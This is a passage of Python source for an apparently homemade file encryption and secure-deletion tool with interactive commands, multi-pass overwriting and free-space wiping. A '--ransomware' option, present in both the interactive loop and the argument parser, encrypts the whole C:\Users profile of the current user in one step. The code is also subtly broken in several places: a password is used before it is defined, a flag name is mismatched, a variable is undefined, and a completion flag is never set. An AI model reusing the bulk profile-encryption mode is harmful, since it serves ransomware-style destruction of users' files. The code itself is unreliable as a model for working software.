				if "-c " in decryption_arguments or "--keep-copy " in decryption_arguments:
					keep_copy = True
					
					args1 = decryption_arguments.replace("-c ", '')
					decryption_arguments = args1.replace("--keep_copy ", '')
					
				if "-rw" in decryption_arguments or "--ransomware" in decryption_arguments:
					args1 = decryption_arguments.replace("-rw", "")
					decryption_arguments = args1.replace("--ransomware", "")
					
					cipher_method = "decrypt"
					current_user = os.getlogin()
					
					self.cipher_directory(
						f"C:\\Users\\{current_user}",
						verbose = self.args.verbose,
						password = password,
						keep_copy = self.args.keep_copy,
						cipher_method = cipher_method
					)
					continue
					
				if "-f " in decryption_arguments or "--file " in decryption_arguments:
					args1 = decryption_arguments.replace("-f ", "")
					argument_files = args1.replace("--file ", "")
					
					files = tokenize(argument_files)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if files:
						self.cipher_file(
							files,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="decrypt"
						)
				if "-dr " in decryption_arguments or "--directory " in decryption_arguments:
					args1 = decryption_arguments.replace("-dr ", "")
					argument_directories = args1.replace("--directory ", "")
					
					directories = tokenize(argument_directories)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if directories:
						self.cipher_directory(
							directories,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="decrypt"
						)
				
				
			if "safedel " in command.lower():
				safedel_arguments = command.replace("safedel ", "").lower()
				
				if "-fd" in safedel_arguments or "--fdel" in safedel_arguments:
					args1 = safedel_arguments.replace("-fd", "")
					safedel_arguments = args1.replace("--fdel", "")
					
					confirm = input("Do you wish to continue? This will remove deleted files from your disk. [Y/N]: ")
					
					if confirm.lower() == "y":
						pass
					else:
						print("fdel canceled, returning. . .")
						continue
					
					symbols = ['\\', '|', '/', '-']
					
					i = 0
					
					dt = DataOverwriter()
					thread = self.thread_create(
						callback = dt.freespace_overwrite
					)
					
					total_start_time = time.time()
					start_time = time.perf_counter()
					
					def get_tempfile_size():
						tempfile_size = 0
						
						while not self.interactive[f"freespace_overwrite | pass3_complete"]:
							if self.cleanup:
								break
							
							try:
								file_stats = os.stat("disk_filler_file.tmp")
								tempfile_size = file_stats.st_size
								
								size_in_gb = float(format(tempfile_size // (1024 * 1024 * 1024)))
								
								sys.stdout.write(f"| current temp file size: {size_in_gb:.2f} GB")
								sys.stdout.flush()
							except ZeroDivisionError:
								pass
							
							time.sleep(0.01)
					
					thread = self.thread_create(
						callback = get_tempfile_size
					)
					
					while True:
						if self.cleanup:
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
							break
						
						if self.interactive[f"freespace_overwrite | pass{current_pass}_complete"] == True:
							end_time = time.perf_counter()
							
							sys.stdout.write(f"\r")
							sys.stdout.write(f"{' ' for i in range(100)}")
							
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							start_time = time.perf_counter()
							continue
						
						end_time = time.perf_counter()
						
						tempfile_size = 0
						
						elapsed_time = end_time - start_time
						mins, sec = divmod(elapsed_time, 60)
						
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . {symbols[i]} | ")
						
						sys.stdout.write(f"time elapsed: {int(mins)} minute{'s' if mins != 1 else ''} ")
						sys.stdout.write(f"{int(sec)} second{'s' if sec != 1 else ''} ")
						
						sys.stdout.flush()
						
						i = (i + 1) % len(symbols)
						time.sleep(0.1)
					
					total_end_time = time.time()
					print(f"total time elapsed for fdel: {(total_end_time - total_start_time):.2f} seconds\n")
					
					continue
				
				files = tokenize(safedel_arguments)
				confirm = input("Do you wish to continue? This process will be irriversible. [Y/N]: ")
				
				if confirm.lower() == "y":
					pass
				else:
					print("safedel canceled, returning. . .")
					continue
				
				print(files)
				
				for current_file, file_to_delete in enumerate(files):
					set_progress_bar = False
					
					symbols = ['\\', '|', '/', '-']
					i = 0
						
					self.interactive[f"{files[current_file]} | cipher_complete"] = False
					
					for iteration in range(16):
						self.interactive[f"{files[current_file]} | pass{iteration + 1}_complete"] = False
					
					current_file_size = os.path.getsize(files[current_file])
					
					def call_cipher(cipher_mode="encrypt", *args):
						self.encrypt_file(*args) if cipher_mode == "encrypt" else self.decrypt_file(*args)
						
						self.interactive[f"{files[current_file]} | cipher_complete"]
						
					thread = self.thread_create(
						callback = call_cipher,
						
						input_file = file,
						password = password,
						keep_copy = keep_copy,
						
						hash_pepper = self.hash_pepper,
						password_pepper = self.password_pepper
					)
					
					total_start_time = time.time()
					
					print(f"\n{files[current_file]}: ")
					start_time = time.perf_counter()
					
					while True:
						if self.cleanup:
							sys.stdout.write(f"\rwaiting for encryption to finish. . . stopped\n\n")
							break
						
						if self.interactive[f"{files[current_file]} | cipher_complete"] == True:
							end_time = time.perf_counter()
							sys.stdout.write(f"\rwaiting for encryption to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							break
						
						sys.stdout.write(f"\rwaiting for encryption to finish. . . {symbols[i]}")
						i = (i + 1) % len(symbols)
						
						time.sleep(0.1)
					
					thread = self.thread_create(
						callback = file_overwrite,
						file_path = files[current_file],
						file_size = current_file_size
					)
					
					current_pass = 1
					start_time = time.perf_counter()
					
					while True:
						if self.cleanup:
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
							break
						
						if self.interactive[f"{files[current_file]} | pass{current_pass}_complete"] == True:
							end_time = time.perf_counter()
							
							sys.stdout.write("\r")
							
							for i in range(100):
								sys.stdout.write(" ")
							
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							current_pass += 1
							
							if current_pass == 17:
								break
							
							start_time = time.perf_counter()
							continue
						
						end_time = time.perf_counter()
						
						tempfile_size = 0
						
						elapsed_time = end_time - start_time
						mins, sec = divmod(elapsed_time, 60)
						
						i = (i + 1) % len(symbols)
						
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . {symbols[i]} | ")
						
						sys.stdout.write(f"time elapsed: {int(mins)} minute{'s' if mins != 1 else ''} ")
						sys.stdout.write(f"{int(sec)} second{'s' if sec != 1 else ''} ")
						
						sys.stdout.flush()
						
						time.sleep(0.1)
					
					total_end_time = time.time()
					print(f"total time elapsed for {files[current_file]}: {(total_end_time - total_start_time):.2f} seconds\n")

	def parse_args(self):
		self.args = self.parser.parse_args()
		
		# Guard clauses
		if self.args.interactive:
			try:
				self.pycrypter_interactive()
			except Exception as err:
				err_name = type(err).__name__
					
				print(f"An unexpected error occured! Details: \n")
				traceback.print_exc()
			
			return
		
		if self.args.threads:
			self.thread_mgr.semaphore = self.args.threads
		
		if self.args.encrypt and self.args.decrypt:
			raise argparse.ArgumentError(None, "expected 1 required argument, got two [-e/--encrypt and -d/--decrypt]")

		if not self.args.encrypt and not self.args.decrypt:
			raise argparse.ArgumentError(None, "missing required argument: -e/--encrypt or -d/--decrypt")
		
		if self.args.ransomware:
			cipher_method = "encrypt" if self.args.encrypt else "decrypt"
			current_user = os.getlogin()
			
			self.cipher_directory(
				f"C:\\Users\\{current_user}",
				verbose = self.args.verbose,
				password = password,
				keep_copy = self.args.keep_copy,
				cipher_method = cipher_method
			)
			sys.exit()

		if self.args.file is None and self.args.directory is None:
			raise argparse.ArgumentError(None, "missing required argument(s): -f/--file or -dr/--directory")
		
		password = getpass.getpass("Enter a password: ")
		
		cipher_method = "encrypt" if self.args.encrypt else "decrypt"
		
		sys.stdout.write("|-------------------------------------------------------------|\n")
		sys.stdout.flush()
		
		if self.args.file:
			self.cipher_file(
				self.args.file,
				verbose = self.args.verbose,
				password = password,
				keep_copy = self.args.keep_copy,
				cipher_method = cipher_method
			)
		
		if self.args.directory:
			self.cipher_directory(
				self.args.directory,
				verbose = self.args.verbose,
				password = password,
				keep_copy = self.args.keep_copy,
				cipher_method = cipher_method
			)
	
	# Check each file/directory
	def cipher_file(self, file_list, skip_files=None, verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		if cipher_method not in ["encrypt", "decrypt"]:
			raise TypeError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
		
		if not skip_files:
			skip_files = set()
		
		files = set()
		files_dict = {'count': 0, 'finished': 0, 'exception_thrown': 0}
		
		for file in file_list:
			if os.path.isfile(file):
				files.add(file)
				files_dict['count'] += 1
				continue

			if len(files) > 1:
				if os.path.isdir(file):
					print(f"IsADirectoryError: [Errno 21] Is a directory: {file}")
				else:
					print(f"FileNotFoundError: [Errno 2] No such file: {file}")
			else:
				if os.path.isdir(file):
					raise IsADirectoryError(f"[Errno 21] Is a directory: {file}")
				else:
					raise FileNotFoundError(f"[Errno 2] No such file: {file}")
		
		files_dict['exception_thrown'] = files_dict['count']
		
		for current_iteration, file in enumerate(files):
			if self.cleanup:
				break
			
			def call_cipher(*args, **kwargs):
				if current_iteration + 1 == files_dict['count']:
					progress_bar(
						files_dict['count'], 
						files_dict['count'], 
						
						prefix='Progress: ', 
						suffix='Complete', 
						
						decimals=1, 
						length=50,
						
						fill='='
					)
				else:
					progress_bar(
						current_iteration, 
						files_dict['count'], 
						
						prefix='Progress: ', 
						suffix='Complete', 
						
						decimals=1, 
						length=50,
						
						fill='='
					)
				
				if cipher_method == "encrypt":
					self.encrypt_file(*args, **kwargs)
				else:
					self.decrypt_file(*args, **kwargs)
				
				files_dict['exception_thrown'] -= 1
				files_dict['finished'] += 1
				
			thread = self.thread_create(
				callback = call_cipher,
				
				input_file = file,
				password = password,
				keep_copy = keep_copy,
				
				hash_pepper = self.hash_pepper,
				password_pepper = self.password_pepper
			)
		
		thread.join()
		
		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_dict['count']}")
			print(f"Total files [processed] : {files_dict['finished']}")

			print(f"Total: {files_dict['count']} | Completed: {files_dict['finished']} | Error thrown: {files_dict['exception_thrown']}\n")

			print(f"Extra information: \nfiles_count: {files_dict['count']} | len(files): {len(files)}")
			print(f"files_finished: {files_dict['finished']}\n")
			
			print(f"ThreadManager errorlist: \n")
			err_list = list(self.thread_mgr.error_list)
			
			for dictionary in err_list:
				print(f"Error name: {dictionary['name']}")
				
				print(f"Caller function: {dictionary['caller']}\n")
				print(f"Error traceback: \n{dictionary['traceback']}")

	def cipher_directory(self, directories, skip_directories=None, verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		if cipher_method not in ["encrypt", "decrypt"]:
			raise TypeError(f'cipher_method expected "encrypt" or "decrypt", got {type(cipher_method).__name__}')
		
		if skip_directories == None:
			skip_directories = set()
		
		files = set()
		folders = set()
		
		files_dict = {'count': 0, 'finished': 0, 'exception_thrown': 0}
		
		for folder in directories:
			if os.path.isdir(folder):
				folders.add(folder)
				continue
			
			if len(directories) > 1:
				if os.path.isdir(folder):
					print(f"NotADirectoryError: [Errno 21] Is a directory: {folder}")
				else:
					print(f"FileNotFoundError: [Errno 2] No such file: {folder}")
			else:
				if os.path.isdir(folder):
					raise NotADirectoryError(f"[Errno 20] Is a directory: {folder}")
				else:
					raise FileNotFoundError(f"[Errno 2] No such directory: {folder}")

		for i, folder in enumerate(folders):
			returned_files = iterate_dir(folder, iterate_tree=True, skip_dirs=skip_directories)
			
			for file in returned_files:
				files.add(file)
				
				if file in files:
					files_dict['count'] += 1
		
		files_dict['exception_thrown'] = files_dict['count']
		
		for current_iteration, file in enumerate(files):
			if self.cleanup:
				break
			
			def call_cipher(*args, **kwargs):
				if current_iteration + 1 == files_dict['count']:
					progress_bar(
						files_dict['count'], 
						files_dict['count'], 
						
						prefix='Progress: ', 
						suffix='Complete', 
						
						decimals=1, 
						length=50,
						
						fill='='
					)
				else:
					progress_bar(
						current_iteration, 
						files_dict['count'], 
						
						prefix='Progress: ', 
						suffix='Complete', 
						
						decimals=1, 
						length=50,
						
						fill='='
					)
				
				if cipher_method == "encrypt":
					self.encrypt_file(*args, **kwargs)
				else:
					self.decrypt_file(*args, **kwargs)
				
				files_dict['exception_thrown'] -= 1
				files_dict['finished'] += 1
				
			thread = self.thread_create(
				callback = call_cipher,
				
				input_file = file,
				password = password,
				keep_copy = keep_copy,
				
				hash_pepper = self.hash_pepper,
				password_pepper = self.password_pepper
			)
		
		thread.join()
		
		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_dict['count']}")
			print(f"Total files [processed] : {files_dict['finished']}")

			print(f"Total: {files_dict['count']} | Completed: {files_dict['finished']} | Error thrown: {files_dict['exception_thrown']}\n")

			print(f"Extra information: \nfiles_count: {files_dict['count']} | len(files): {len(files)}")
			print(f"files_finished: {files_dict['finished']}\n")
			
			print(f"ThreadManager errorlist: \n")
			err_list = list(self.thread_mgr.error_list)
			
			for dictionary in err_list:
				print(f"Error name: {dictionary['name']}")
				
				print(f"Caller function: {dictionary['caller']}\n")
				print(f"Error traceback: \n{dictionary['traceback']}")
			
if __name__ == "__main__":
	main = Main()
	
	def script_cleanup(signal=0, frame=None):
		main.cleanup = True
	
	if platform.system() == "Windows":
		# kernel32 signal handler
		kernel32 = ctypes.windll.kernel32
		handler_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)

		handler_func = handler_type(lambda signal: script_cleanup(signal))
		kernel32.SetConsoleCtrlHandler(handler_func, True)

		signal.signal(signal.SIGINT, lambda signal, frame: None)
	else:
		signal.signal(signal.SIGINT, lambda signal, frame: script_cleanup(signal, frame=frame))
	
	main.parse_args()
